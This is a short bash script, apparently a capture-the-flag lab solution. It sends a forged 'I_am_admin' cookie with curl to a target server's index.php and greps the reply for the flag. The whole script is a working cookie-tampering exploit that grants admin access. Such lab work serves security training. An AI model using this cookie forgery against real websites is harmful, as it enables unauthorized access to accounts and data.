IP=`head -n 1 '../../src/env_IP'`
IP_len=${#IP}
if [[ IP_len -gt 0 ]]
then
  continue
else
  echo "Input server IP address:" 
  read IP
fi

curl -b 'I_am_admin=b326b5062b2f0e69046810717534cb09' http://$IP/index.php | grep 'Flag'